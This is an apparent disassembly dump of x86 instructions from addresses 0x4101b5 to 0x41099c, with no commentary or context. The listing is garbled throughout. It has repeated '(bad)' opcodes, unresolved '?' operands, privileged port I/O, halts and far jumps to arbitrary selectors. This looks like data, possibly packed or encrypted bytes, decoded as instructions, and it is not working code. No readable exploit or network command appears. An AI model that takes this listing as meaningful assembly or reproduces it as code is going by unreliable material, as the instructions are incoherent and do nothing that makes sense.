  4101b5:	mov    ebx,DWORD PTR [eax]
  4101b7:	cmp    al,0xbb
  4101b9:	mov    dh,0xe3
  4101bb:	sub    BYTE PTR [ebx-0x4],al
  4101be:	les    edx,FWORD PTR [esi+ecx*2+0x61]
  4101c2:	retf   
  4101c3:	fsub   QWORD PTR [ebx]
  4101c5:	fdivr  QWORD PTR [edx+0x7e1a8921]
  4101cb:	repnz mov al,0xf1
  4101ce:	dec    ebx
  4101cf:	stc    
  4101d0:	call   0xf89eccc8
  4101d5:	sub    dl,al
  4101d7:	fnstsw WORD PTR [esi+0x4c]
  4101da:	daa    
  4101db:	push   esi
  4101dc:	jmp    0x80ff:0x8456a71d
  4101e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101e4:	add    ah,BYTE PTR [ebx-0x5d]
  4101e7:	or     BYTE PTR [edi+ecx*4+0x7f3d60d8],bl
  4101ee:	inc    esi
  4101ef:	test   eax,0x631c1c6d
  4101f4:	or     BYTE PTR [eax],bl
  4101f6:	cmc    
  4101f7:	mov    ch,0xf2
  4101f9:	jmp    0xffd1ea73
  4101fe:	and    BYTE PTR [ebp-0x36],ah
  410201:	retf   0xf670
  410204:	(bad)  
  410205:	cwde   
  410206:	int    0xea
  410208:	mov    eax,0xca4d7ca0
  41020d:	xor    BYTE PTR [ebx-0x45],bl
  410210:	or     ebx,DWORD PTR [edi]
  410212:	gs fwait
  410214:	in     al,dx
  410215:	mov    esp,0xf3ec20f5
  41021a:	mov    edi,0xa6a1a205
  41021f:	sbb    DWORD PTR [eax+ebp*1-0x72],esi
  410223:	push   ecx
  410224:	sub    edi,DWORD PTR [eax+0x2]
  410227:	addr16 push ds
  410229:	jae    0x410200
  41022b:	ret    
  41022c:	in     al,0x4e
  41022e:	mov    ds:0xc5dcddb9,eax
  410233:	sub    eax,0xa772b537
  410238:	pop    ebp
  410239:	fucomi st,st(4)
  41023b:	mov    edx,0xd40a5f91
  410240:	pop    ebx
  410241:	sahf   
  410242:	push   0xffffffc1
  410244:	vprotw xmm11,[edi+0x8],xmm2
  41024a:	aam    0xcb
  41024c:	(bad)  
  41024d:	pop    esp
  41024e:	adc    edi,DWORD PTR [ecx-0x5d40f70b]
  410254:	pop    ecx
  410255:	cmp    eax,0x3c83d912
  41025a:	push   ss
  41025b:	jl     0x410237
  41025d:	hlt    
  41025e:	mov    ch,0x72
  410260:	retf   
  410261:	daa    
  410262:	add    bh,BYTE PTR [ebx]
  410264:	sub    al,0x6
  410266:	push   edx
  410267:	xor    ebp,eax
  410269:	ins    DWORD PTR es:[edi],dx
  41026a:	push   ds
  41026b:	loope  0x4101fd
  41026d:	sub    esp,DWORD PTR [ebx+edx*2-0x5b5c94e1]
  410274:	dec    eax
  410275:	push   cs
  410276:	dec    edi
  410277:	jle    0x41027e
  410279:	fisub  WORD PTR ds:0x95fd9283
  41027f:	jo     0x4102e0
  410281:	sbb    BYTE PTR [edx],al
  410283:	mov    ecx,DWORD PTR ds:0x230fbf45
  410289:	mov    ds:0xf9c5d7b3,al
  41028e:	dec    esp
  41028f:	sub    al,bl
  410291:	push   edx
  410292:	or     dl,bl
  410294:	ror    ch,cl
  410296:	mov    ecx,0x83597055
  41029b:	adc    BYTE PTR [ebp-0x5aab624c],dl
  4102a1:	rcr    DWORD PTR [ecx-0x7072d195],0x53
  4102a8:	mov    ds:0xc8a63ab7,al
  4102ad:	add    al,0x96
  4102af:	in     al,dx
  4102b0:	mov    ah,0xd2
  4102b2:	push   ecx
  4102b3:	mov    ebp,0xf3d7ed4c
  4102b8:	in     eax,0x71
  4102ba:	inc    ebp
  4102bb:	(bad)  
  4102bc:	in     al,dx
  4102bd:	shl    al,cl
  4102bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102c0:	add    ecx,DWORD PTR [esi+0x55]
  4102c3:	pushf  
  4102c4:	push   ecx
  4102c5:	fld    QWORD PTR [esi-0x6a]
  4102c8:	xchg   esi,eax
  4102c9:	out    dx,al
  4102ca:	outs   dx,BYTE PTR ds:[esi]
  4102cb:	loop   0x4102aa
  4102cd:	jae    0x4102cd
  4102cf:	(bad)  
  4102d0:	out    dx,al
  4102d1:	and    BYTE PTR ds:0xcdef7af,cl
  4102d7:	sbb    ch,BYTE PTR [edx+0x3b]
  4102da:	adc    BYTE PTR [edx*4+0x575dc869],ch
  4102e1:	inc    ebp
  4102e2:	ror    DWORD PTR [eax+eiz*1+0x62f2cf48],0xda
  4102ea:	(bad)  
  4102ec:	cld    
  4102ed:	daa    
  4102ee:	ret    
  4102ef:	jp     0x4102f4
  4102f1:	fcom   DWORD PTR [esi]
  4102f3:	push   edi
  4102f4:	add    eax,0x7af2c0ce
  4102f9:	retf   0x5f9
  4102fc:	(bad)  
  4102fd:	jl     0x410370
  4102ff:	pusha  
  410300:	aad    0x27
  410302:	mov    ds:0xe0e5051b,al
  410307:	jmp    0xb0373e67
  41030c:	fisub  WORD PTR [esi+ecx*8-0x68]
  410310:	push   eax
  410311:	cmc    
  410312:	xor    BYTE PTR [edx+0x31a75ef2],0x3c
  410319:	push   esi
  41031a:	sti    
  41031b:	imul   ebp,DWORD PTR [eax+0x6a],0xffffffca
  41031f:	leave  
  410320:	(bad)  
  410321:	aaa    
  410322:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410323:	comiss xmm2,DWORD PTR [ecx]
  410326:	sar    ebx,0xd9
  410329:	imul   eax
  41032b:	pop    ebp
  41032c:	ret    
  41032d:	mov    ebx,0x3b9dc574
  410332:	out    dx,eax
  410333:	ret    0xf68f
  410336:	mov    ah,0x2b
  410338:	nop
  410339:	sbb    edx,DWORD PTR ds:0x3f5e607e
  41033f:	sbb    al,0x9b
  410341:	ins    DWORD PTR es:[edi],dx
  410342:	add    al,0x97
  410344:	mov    dl,0x23
  410346:	jl     0x410324
  410348:	ins    BYTE PTR es:[edi],dx
  410349:	cmp    DWORD PTR [ecx+0x13],ecx
  41034c:	adc    al,0xdf
  41034e:	and    esp,eax
  410350:	cld    
  410351:	pop    ebp
  410352:	ror    DWORD PTR [ebp+0x19],cl
  410355:	jne    0x41037e
  410357:	popf   
  410358:	add    DWORD PTR ds:0xd2c38700,eax
  41035e:	arpl   WORD PTR [esi-0x4b],si
  410361:	push   esp
  410362:	shl    DWORD PTR [esi+0x143e211d],cl
  410368:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410369:	xchg   edx,eax
  41036a:	push   cs
  41036b:	(bad)  
  41036d:	dec    ecx
  41036e:	(bad)  
  41036f:	xor    DWORD PTR [ebx+0xd53cf9f],edx
  410375:	push   edi
  410376:	lock fsubp st(3),st
  410379:	mov    ds:0x507f5c60,eax
  41037e:	jp     0x4103ea
  410380:	mov    dl,0xf2
  410382:	push   cs
  410383:	xchg   ebp,eax
  410384:	call   0xf2f1:0x95bc249b
  41038b:	mov    ch,0xce
  41038d:	mov    dh,0x21
  41038f:	(bad)  
  410390:	jmp    0x341cce54
  410395:	mov    edx,0x70a4729e
  41039a:	jmp    0x3236:0x7bd538be
  4103a1:	push   0xffffff88
  4103a3:	cmp    BYTE PTR [ebx-0x17],cl
  4103a6:	test   ebx,esi
  4103a8:	push   eax
  4103a9:	or     DWORD PTR [edx-0x60],esi
  4103ac:	fwait
  4103ad:	in     eax,0x7
  4103af:	dec    BYTE PTR [ebx-0x768c8b99]
  4103b5:	and    edx,DWORD PTR ds:0x18f0438f
  4103bb:	inc    ebp
  4103bc:	sub    BYTE PTR [ebp+0x3c],al
  4103bf:	stos   DWORD PTR es:[edi],eax
  4103c0:	xchg   ebp,eax
  4103c1:	dec    eax
  4103c2:	cmp    DWORD PTR [eax+0xabb6fb0],eax
  4103c8:	imul   edi,DWORD PTR [edx-0x5b],0x2d
  4103cc:	and    eax,0x4fd2922c
  4103d1:	lods   eax,DWORD PTR ds:[esi]
  4103d2:	test   al,0xed
  4103d4:	sbb    eax,0x9c57e080
  4103d9:	inc    esp
  4103da:	scas   eax,DWORD PTR es:[edi]
  4103db:	dec    ebx
  4103dc:	out    dx,eax
  4103dd:	adc    al,0xf2
  4103df:	and    eax,0x23ae100a
  4103e4:	test   BYTE PTR [esi+edx*4-0x72d5d33d],ah
  4103eb:	adc    ch,0x16
  4103ee:	dec    ebp
  4103ef:	stc    
  4103f0:	xor    eax,DWORD PTR [edx]
  4103f2:	fbld   TBYTE PTR [ebx+0xd530b25]
  4103f8:	adc    al,0x52
  4103fa:	cs cdq 
  4103fc:	(bad)  
  4103fd:	int3   
  4103fe:	push   0x75
  410400:	add    ebp,DWORD PTR [edi-0x13]
  410403:	sub    eax,0xe61bae41
  410408:	jle    0x4103a9
  41040a:	repz aas 
  41040c:	cdq    
  41040d:	xor    al,0x94
  41040f:	mov    ds:0x3c9de36c,eax
  410414:	push   edi
  410415:	push   esp
  410416:	ret    
  410417:	jne    0x410491
  410419:	call   0xebbd9ed2
  41041e:	call   0x7f01:0x3c39d36
  410425:	mov    edi,esi
  410427:	popa   
  410428:	pop    edx
  410429:	mov    dl,ah
  41042b:	cmc    
  41042c:	test   BYTE PTR [eax],ah
  41042e:	les    eax,FWORD PTR [edi-0x1b]
  410431:	and    DWORD PTR [eax],ebp
  410433:	xchg   edx,eax
  410434:	jecxz  0x4103cf
  410436:	test   al,0x9b
  410438:	cmp    DWORD PTR [esi],ebp
  41043a:	mov    edx,DWORD PTR [ecx+0x63]
  41043d:	push   ecx
  41043e:	add    eax,0x171a5e7b
  410443:	jo     0x410409
  410445:	stos   DWORD PTR es:[edi],eax
  410446:	mov    esi,0x19b80bb8
  41044b:	mov    edx,0x242b2e31
  410450:	sbb    eax,0xa293bb88
  410455:	ja     0x4103f6
  410457:	addr16 cdq 
  410459:	jbe    0x410441
  41045b:	mov    eax,ds:0x5d8ad1f7
  410460:	push   ds
  410461:	xlat   BYTE PTR ds:[ebx]
  410462:	enter  0x14d8,0xf2
  410466:	cld    
  410467:	out    0x88,eax
  410469:	les    edi,FWORD PTR [eax-0x72]
  41046c:	xor    ebp,DWORD PTR [edx+0x56]
  41046f:	cmc    
  410470:	xchg   BYTE PTR [ebp+0x70],al
  410473:	dec    eax
  410474:	ret    0xe256
  410477:	pop    ebx
  410478:	and    ah,0xf1
  41047b:	inc    ecx
  41047c:	fld    TBYTE PTR [ecx+0x64186663]
  410482:	mov    cl,0xdb
  410484:	cmp    BYTE PTR [edi-0x5d],al
  410487:	fs mov dh,0x19
  41048a:	bound  esi,QWORD PTR [esi]
  41048c:	sbb    dl,cl
  41048e:	cmp    ah,BYTE PTR [edx]
  410490:	pop    ebx
  410491:	push   0x18
  410493:	add    DWORD PTR [edx],esp
  410495:	push   es
  410496:	test   al,dh
  410498:	cs xchg ebp,eax
  41049a:	gs jge 0x4104b4
  41049d:	adc    BYTE PTR [ebx],dh
  41049f:	jb     0x410469
  4104a1:	sbb    al,0x23
  4104a3:	cmp    BYTE PTR cs:[esi-0x1a],dl
  4104a7:	xchg   esp,eax
  4104a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104a9:	test   ebp,eax
  4104ab:	ds (bad) 
  4104ae:	and    BYTE PTR [ebp-0x58601935],0xc8
  4104b5:	inc    ecx
  4104b6:	mov    dl,0xc2
  4104b8:	mov    ebp,0xec27baab
  4104bd:	pusha  
  4104be:	push   eax
  4104bf:	cs mov ebx,0x95dd911e
  4104c5:	mov    dl,0x85
  4104c7:	or     eax,0x7a00c488
  4104cc:	sbb    ebp,DWORD PTR [esi]
  4104ce:	sbb    BYTE PTR [ebx-0x42],al
  4104d1:	fld    st(2)
  4104d3:	adc    BYTE PTR [esi+eax*1-0x9],0xc1
  4104d8:	(bad)  
  4104d9:	and    edx,DWORD PTR [ecx]
  4104db:	int3   
  4104dc:	test   DWORD PTR [edx-0x266d5171],ebx
  4104e2:	je     0x4104a6
  4104e4:	xor    ecx,DWORD PTR [ebp+0x6]
  4104e7:	cli    
  4104e8:	int3   
  4104e9:	aaa    
  4104ea:	push   esi
  4104eb:	cmp    DWORD PTR [ecx],esi
  4104ed:	hlt    
  4104ee:	cmp    DWORD PTR [ecx-0x21dafafa],ecx
  4104f4:	es pop ebp
  4104f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104f7:	mov    al,0xae
  4104f9:	rcr    DWORD PTR [ebp-0xa66807f],1
  4104ff:	cld    
  410500:	mov    esi,0x45c7ddd4
  410505:	xor    edx,0x3c
  410508:	jmp    0xd77:0x914b7375
  41050f:	je     0x4104e2
  410511:	scas   eax,DWORD PTR es:[edi]
  410512:	jg     0x4104b6
  410514:	sub    dh,BYTE PTR [ebx]
  410516:	mov    al,ds:0x2ad2f7d1
  41051b:	lods   al,BYTE PTR ds:[esi]
  41051c:	push   ds
  41051d:	test   BYTE PTR [ebx*2-0x59b9a832],ah
  410524:	mov    ebx,0xd2b3ef45
  410529:	xchg   edx,eax
  41052a:	call   0x3c946fb8
  41052f:	rol    BYTE PTR [edi+0x6c],0xcb
  410533:	(bad)  
  410534:	or     ch,BYTE PTR [esi]
  410536:	add    BYTE PTR [edx],dl
  410538:	mov    al,BYTE PTR [ebx+0x1b]
  41053b:	or     BYTE PTR [ecx+0x58],bh
  41053e:	(bad)  
  41053f:	push   0x30
  410541:	cli    
  410542:	shr    DWORD PTR [edx+0x67a8300],1
  410548:	sub    DWORD PTR [edi],esi
  41054a:	(bad)  
  41054b:	jne    0x41057f
  41054d:	std    
  41054e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41054f:	jl     0x410580
  410551:	cmp    BYTE PTR [esi-0x3802e205],ah
  410557:	cli    
  410558:	push   0x51
  41055a:	push   esi
  41055b:	test   eax,0x727225b7
  410560:	test   DWORD PTR cs:[ecx-0x6ac2d9be],esp
  410567:	mov    ds:0xa1d5e72b,al
  41056c:	cld    
  41056d:	lods   eax,DWORD PTR ds:[esi]
  41056e:	sub    edx,DWORD PTR [ecx+0x32e55107]
  410574:	popa   
  410575:	rol    BYTE PTR [edx],0x2a
  410578:	out    dx,al
  410579:	xor    al,0x57
  41057b:	fwait
  41057c:	test   DWORD PTR [esi],0x51f10a21
  410582:	sar    DWORD PTR [eax+0x25dc1110],0x5e
  410589:	push   0xf7a37c89
  41058e:	cli    
  41058f:	push   esi
  410590:	jb     0x4105e3
  410592:	mov    edi,0x6ee1400a
  410597:	and    eax,0xa33fc478
  41059c:	int3   
  41059d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41059e:	leave  
  41059f:	shr    DWORD PTR [ebx],1
  4105a1:	std    
  4105a2:	mov    ebp,0xfa62e4cd
  4105a7:	xchg   edx,eax
  4105a8:	scas   al,BYTE PTR es:[edi]
  4105a9:	cdq    
  4105aa:	and    esp,DWORD PTR [edx+0x23]
  4105ad:	dec    ecx
  4105ae:	gs (bad) 
  4105b0:	fstp   DWORD PTR [eax]
  4105b2:	call   0x9758e60b
  4105b7:	and    BYTE PTR [edi-0x502bbce7],ch
  4105bd:	cmp    al,0xc7
  4105bf:	test   eax,0xc856f51a
  4105c4:	xchg   bp,ax
  4105c6:	(bad)  
  4105c7:	sub    DWORD PTR [edi+0x51],esp
  4105ca:	mov    dh,0x79
  4105cc:	call   0x424c9747
  4105d1:	add    BYTE PTR [edi-0x20],ah
  4105d4:	mov    dh,bh
  4105d6:	sbb    DWORD PTR [esi+0x8e8af66],esi
  4105dc:	cwde   
  4105dd:	fstp   DWORD PTR ds:0xe1479110
  4105e3:	js     0x410568
  4105e5:	pop    es
  4105e6:	out    dx,eax
  4105e7:	push   edx
  4105e8:	sbb    BYTE PTR [esi+edi*8-0x1c599e92],0xeb
  4105f0:	add    eax,0xc5a0666d
  4105f5:	xchg   esi,eax
  4105f6:	div    ah
  4105f8:	add    al,BYTE PTR [edi-0x14]
  4105fb:	leave  
  4105fc:	(bad)  
  4105fd:	pop    esp
  4105fe:	lock lds eax,FWORD PTR [eax+0x59]
  410602:	inc    ebp
  410603:	jle    0x4105ba
  410605:	mov    edi,0x603458f3
  41060a:	add    BYTE PTR [ebp-0x431489d9],dl
  410610:	pop    ecx
  410611:	adc    al,0xce
  410613:	cmp    eax,0x434fc3a0
  410618:	sub    cl,BYTE PTR ds:0xe4c6f074
  41061e:	jle    0x410620
  410620:	pop    eax
  410621:	sub    edi,0x20fe4442
  410627:	(bad)  
  410628:	push   ss
  410629:	jl     0x4105f5
  41062b:	cdq    
  41062c:	jmp    0xcf720930
  410631:	cmp    edx,DWORD PTR [esi-0x58]
  410634:	test   eax,0x50c6a019
  410639:	repz scas al,BYTE PTR es:[edi]
  41063b:	jnp    0x4105c6
  41063d:	pop    edi
  41063e:	fidiv  WORD PTR [ebp+0x7b]
  410641:	out    0x16,al
  410643:	mov    ebx,0x6301b9b8
  410648:	out    0xdc,eax
  41064a:	fadd   QWORD PTR [ebx-0x22]
  41064d:	lods   eax,DWORD PTR ds:[esi]
  41064e:	idiv   DWORD PTR ss:[eax+0x7]
  410652:	sahf   
  410653:	push   0xffffffe9
  410655:	jns    0x410645
  410657:	ror    ebp,1
  410659:	pop    ebx
  41065a:	loopne 0x410665
  41065c:	fiadd  WORD PTR [edi+0x55]
  41065f:	lods   eax,DWORD PTR ds:[esi]
  410660:	adc    bl,BYTE PTR [edi+0x60]
  410663:	xor    eax,0xadbca07a
  410668:	mov    bl,0x1d
  41066a:	outs   dx,DWORD PTR ds:[esi]
  41066b:	enter  0x37d4,0xf4
  41066f:	cwde   
  410670:	adc    DWORD PTR [edx-0x3e],edi
  410673:	fidiv  DWORD PTR [esp+esi*8+0x254787ef]
  41067a:	or     al,BYTE PTR [esi]
  41067c:	lds    ecx,FWORD PTR [edx+eax*8+0x6f]
  410680:	mov    eax,ds:0xdf69e30c
  410685:	dec    esp
  410686:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410687:	aad    0xc8
  410689:	mov    cl,dh
  41068b:	sub    al,0xdc
  41068d:	popf   
  41068e:	sti    
  41068f:	or     DWORD PTR [edx],0xfffffff6
  410692:	(bad)  
  410693:	and    BYTE PTR [eax+0x455bb59f],dl
  410699:	inc    eax
  41069a:	(bad)  
  41069b:	adc    eax,0x6662da10
  4106a0:	mov    ecx,0x8814a1a1
  4106a5:	call   0x7cd4:0x6b0f4a31
  4106ac:	ret    
  4106ad:	dec    eax
  4106ae:	and    DWORD PTR [edi-0x3e3122c],0x9550a0f
  4106b8:	mov    ebp,0x6d5b3054
  4106bd:	daa    
  4106be:	cmp    DWORD PTR [eax+0x60],edi
  4106c1:	mov    al,ds:0x4ef84051
  4106c6:	add    edi,ebp
  4106c8:	retf   0x10f9
  4106cb:	inc    esi
  4106cc:	xchg   BYTE PTR [eax-0x22c5427d],bh
  4106d2:	pop    edx
  4106d3:	add    eax,0x8c9e5c1c
  4106d8:	icebp  
  4106d9:	mov    eax,0x4a644136
  4106de:	std    
  4106df:	leave  
  4106e0:	mov    bl,0x91
  4106e2:	int    0x72
  4106e4:	enter  0x3863,0xb4
  4106e8:	dec    edi
  4106e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106ea:	pusha  
  4106eb:	pop    esi
  4106ec:	sbb    al,0xb2
  4106ee:	aas    
  4106ef:	rol    DWORD PTR [esi],0x2e
  4106f2:	mov    WORD PTR [edx],?
  4106f4:	js     0x4106ca
  4106f6:	add    BYTE PTR [edi+0x4c],al
  4106f9:	jge    0x41076f
  4106fb:	ins    BYTE PTR es:[edi],dx
  4106fc:	pop    DWORD PTR [eax+0x690efff3]
  410702:	inc    esi
  410703:	mov    ds:0x70f1d859,eax
  410708:	imul   ecx,DWORD PTR [ebx-0x675d9544],0xcf90a8
  410712:	shr    BYTE PTR [esi],1
  410714:	dec    edi
  410715:	adc    dl,BYTE PTR ds:0xbd61dd48
  41071b:	dec    edx
  41071c:	loopne 0x41071a
  41071e:	fisttp QWORD PTR [ecx-0x6d]
  410721:	cmp    eax,0x1c9bb85a
  410726:	pop    ebp
  410727:	je     0x4106d5
  410729:	fldcw  WORD PTR [edx+0x70]
  41072c:	ja     0x4106e6
  41072e:	daa    
  41072f:	hlt    
  410730:	fnsave [edi+0x39]
  410733:	cmp    eax,0x1108d1f3
  410738:	adc    al,0x5d
  41073a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41073b:	out    0xad,eax
  41073d:	fwait
  41073e:	mov    dl,BYTE PTR cs:[ebp+0x50c063e3]
  410745:	sbb    ecx,DWORD PTR [ebx+0x55f6307]
  41074b:	jb     0x410738
  41074d:	push   ds
  41074e:	pop    eax
  41074f:	dec    ebp
  410750:	pmuludq mm3,QWORD PTR [ecx]
  410753:	fld    DWORD PTR [ebx+ebx*8]
  410756:	scas   al,BYTE PTR es:[edi]
  410757:	scas   al,BYTE PTR es:[edi]
  410758:	xchg   esp,eax
  410759:	sub    esp,DWORD PTR [edi]
  41075b:	mov    ecx,0x6f90f3a8
  410760:	pop    edi
  410761:	in     eax,dx
  410762:	mov    WORD PTR [eax],ss
  410764:	dec    esp
  410765:	xchg   edx,eax
  410766:	cmc    
  410767:	sub    eax,0x83291710
  41076c:	repz xchg esp,eax
  41076e:	ins    BYTE PTR es:[edi],dx
  41076f:	mov    al,ch
  410771:	sub    dh,BYTE PTR [edx-0x41]
  410774:	mov    edi,0x8e39d882
  410779:	imul   esp,edi,0x74
  41077c:	push   edi
  41077d:	cs aaa 
  41077f:	mov    ds:0xd4ea85ba,al
  410784:	add    eax,0x3f0f2ffd
  410789:	jmp    0x410779
  41078b:	jecxz  0x410793
  41078d:	(bad)  
  41078e:	fild   QWORD PTR [edi-0x26]
  410791:	push   ss
  410792:	in     al,0xfd
  410794:	outs   dx,BYTE PTR ds:[esi]
  410795:	shl    esp,cl
  410797:	lahf   
  410798:	outs   dx,BYTE PTR ds:[esi]
  410799:	js     0x410747
  41079b:	xchg   edx,eax
  41079c:	mov    eax,0xcf3b8ac7
  4107a1:	dec    edi
  4107a2:	and    al,0x1e
  4107a4:	jl     0x410789
  4107a6:	xchg   al,bh
  4107a8:	xchg   DWORD PTR [ebp-0x4074f8a2],ebp
  4107ae:	mov    ebp,ss
  4107b0:	mov    ecx,0x87e4119d
  4107b5:	imul   ebp,DWORD PTR [ebx-0x35e05ecc],0x3977f51c
  4107bf:	dec    edi
  4107c0:	xchg   esi,eax
  4107c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107c2:	xchg   ebx,eax
  4107c3:	push   es
  4107c4:	test   al,0xb9
  4107c6:	js     0x4107be
  4107c8:	nop
  4107c9:	sahf   
  4107ca:	xchg   BYTE PTR ds:0x43fafa5d,cl
  4107d0:	pop    ss
  4107d1:	popf   
  4107d2:	dec    ebx
  4107d3:	and    eax,ebx
  4107d5:	mov    eax,ds:0xf68d7ace
  4107da:	xor    edi,edi
  4107dc:	ret    
  4107dd:	cmp    eax,DWORD PTR [edx+ebx*2+0x31a5e49d]
  4107e4:	hlt    
  4107e5:	jne    0x410836
  4107e7:	push   eax
  4107e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107e9:	aam    0x31
  4107eb:	cmp    bh,BYTE PTR [ebx-0x66197e9b]
  4107f1:	mov    bl,0x9b
  4107f3:	pop    ebp
  4107f4:	xor    ah,BYTE PTR [ebx-0x2dac889]
  4107fa:	ror    dh,cl
  4107fc:	pop    ds
  4107fd:	pop    eax
  4107fe:	mov    ebx,DWORD PTR [ecx]
  410800:	inc    ecx
  410801:	push   edx
  410802:	mov    dh,0x42
  410804:	pop    eax
  410805:	cdq    
  410806:	dec    ecx
  410807:	hlt    
  410808:	in     al,0x31
  41080a:	pusha  
  41080b:	adc    esi,ecx
  41080d:	mov    ?,esp
  41080f:	mov    ds:0x72a93c30,al
  410814:	les    esi,FWORD PTR [ebp-0x20]
  410817:	daa    
  410818:	pop    esp
  410819:	mov    al,ds:0x1a38fe3c
  41081e:	inc    esp
  41081f:	ja     0x4107dd
  410821:	cmp    al,BYTE PTR [ebx-0x1d467b4b]
  410827:	mov    edx,0x61f473c9
  41082c:	xor    eax,0x65e86598
  410831:	daa    
  410832:	dec    ecx
  410833:	ds mov eax,0xb5db7cfd
  410839:	in     eax,0x9e
  41083b:	mov    bl,0xb3
  41083d:	aas    
  41083e:	jecxz  0x4107c4
  410840:	(bad)  
  410841:	not    BYTE PTR [ebp+0x3d]
  410844:	out    0xa1,eax
  410846:	loope  0x410890
  410848:	and    ch,dh
  41084a:	jmp    0x4108b4
  41084c:	mov    cs:0x3a6f4a95,eax
  410852:	outs   dx,BYTE PTR ds:[esi]
  410853:	or     DWORD PTR [ebx-0x58],esi
  410856:	rcr    DWORD PTR [edx-0x6830309d],1
  41085c:	fwait
  41085d:	jmp    0xc21d7d7d
  410862:	outs   dx,BYTE PTR ds:[esi]
  410863:	lock lods al,BYTE PTR ds:[esi]
  410865:	jp     0x410829
  410867:	hlt    
  410868:	dec    esp
  410869:	cmp    BYTE PTR [edx],ah
  41086b:	push   esi
  41086c:	neg    DWORD PTR [edx-0x67]
  41086f:	mov    esp,0x3fab0260
  410874:	das    
  410875:	(bad)  
  410876:	div    BYTE PTR [eax+0x37e45625]
  41087c:	js     0x4108eb
  41087e:	adc    al,0x14
  410880:	inc    edx
  410881:	lahf   
  410882:	inc    esi
  410883:	out    0x2a,al
  410885:	imul   ebx,DWORD PTR [ebp+0x12],0x1b
  410889:	pop    ebx
  41088a:	inc    edi
  41088b:	mov    edi,esp
  41088d:	pop    es
  41088e:	mov    DWORD PTR [ebx-0x65ac6e19],0x86232339
  410898:	test   al,0x50
  41089a:	add    al,0x2b
  41089c:	adc    al,0xcb
  41089e:	bound  esp,QWORD PTR [esi-0x9]
  4108a1:	push   ecx
  4108a2:	push   ds
  4108a3:	cmc    
  4108a4:	(bad)  
  4108a5:	mov    al,0xe6
  4108a7:	xchg   ebx,eax
  4108a8:	retf   0x2fb6
  4108ab:	repnz mov esi,0x6197ca30
  4108b1:	jge    0x41087f
  4108b3:	mov    ah,0xce
  4108b5:	push   esp
  4108b6:	popf   
  4108b7:	pop    edx
  4108b8:	repnz mov eax,ds:0x1e053178
  4108be:	mov    bl,0x71
  4108c0:	jb     0x4108e3
  4108c2:	out    dx,eax
  4108c3:	or     ch,BYTE PTR [ecx]
  4108c5:	sub    al,0x3a
  4108c7:	inc    esi
  4108c8:	lock xchg edx,eax
  4108ca:	sub    al,0xfc
  4108cc:	mov    ebx,DWORD PTR [ebp-0x112382d8]
  4108d2:	inc    esp
  4108d3:	push   ss
  4108d4:	sbb    BYTE PTR [edx],bh
  4108d6:	lods   eax,DWORD PTR ds:[esi]
  4108d7:	push   0xd1454c91
  4108dc:	lahf   
  4108dd:	pop    edi
  4108de:	add    DWORD PTR [ebx-0x70c2592b],0x736544be
  4108e8:	jbe    0x41094d
  4108ea:	adc    BYTE PTR ds:[ebp-0x29],ch
  4108ee:	imul   ecx,DWORD PTR [ebx+0x480cbadb],0x7ada8718
  4108f8:	jno    0x4108c7
  4108fa:	jbe    0x410949
  4108fc:	and    DWORD PTR [eax+0x63],0xffffffe6
  410900:	lods   eax,DWORD PTR ds:[esi]
  410901:	push   es
  410902:	dec    edi
  410903:	pop    ss
  410904:	nop
  410905:	sar    eax,0xd5
  410908:	outs   dx,DWORD PTR ds:[esi]
  410909:	jbe    0x410943
  41090b:	pop    esp
  41090c:	sub    DWORD PTR [esi],ebp
  41090e:	mov    ch,0x3
  410910:	rcl    edi,0xa0
  410913:	jg     0x410904
  410915:	pop    esi
  410916:	out    dx,al
  410917:	mov    bl,0xc0
  410919:	push   ds
  41091a:	inc    eax
  41091b:	adc    DWORD PTR [edx+esi*2+0x19ceba57],ebp
  410922:	xlat   BYTE PTR ds:[ebx]
  410923:	outs   dx,BYTE PTR ds:[esi]
  410924:	add    BYTE PTR [edi],dl
  410926:	mov    eax,ds:0x8f042d5a
  41092b:	enter  0xe55a,0xaa
  41092f:	push   ebx
  410930:	mov    bl,0x29
  410932:	loopne 0x41098b
  410934:	inc    edx
  410935:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410936:	loop   0x4108d4
  410938:	mov    bh,BYTE PTR [edx]
  41093a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41093b:	pop    eax
  41093c:	cld    
  41093d:	sub    al,0xcc
  41093f:	pop    ds
  410940:	in     al,0xc3
  410942:	scas   eax,DWORD PTR es:[edi]
  410943:	xchg   ebx,eax
  410944:	in     eax,0x5d
  410946:	mov    esi,0x73e77a59
  41094b:	xchg   ebx,eax
  41094c:	outs   dx,BYTE PTR ds:[esi]
  41094d:	cld    
  41094e:	xchg   ebp,eax
  41094f:	xchg   ebx,eax
  410950:	xchg   ebp,eax
  410951:	xor    DWORD PTR gs:[esi],ebp
  410954:	rcl    BYTE PTR [ebx-0x769469cb],1
  41095a:	mov    ds:0x5d203921,al
  41095f:	pop    edx
  410960:	pop    edi
  410961:	mov    ebx,0xde5f6e2
  410966:	push   cs
  410967:	sub    BYTE PTR [edi*4-0xfad945b],bh
  41096e:	push   ebp
  41096f:	push   ebp
  410970:	sub    eax,0x934b8a75
  410975:	or     DWORD PTR [ecx],edx
  410977:	cwde   
  410978:	shr    BYTE PTR [edx],cl
  41097a:	rcr    ecx,cl
  41097c:	out    dx,eax
  41097d:	jns    0x410943
  41097f:	js     0x4109e7
  410981:	add    BYTE PTR [eax+0x0],ah
  410984:	dec    esp
  410985:	hlt    
  410986:	mov    ah,0xb1
  410988:	(bad)  
  410989:	in     eax,dx
  41098a:	int    0x89
  41098c:	or     ah,BYTE PTR [edi+esi*2-0x53f6dc05]
  410993:	mov    WORD PTR [esi-0x4b],?
  410996:	cmc    
  410997:	mov    ecx,0xea5eb53
  41099c:	dec    edi
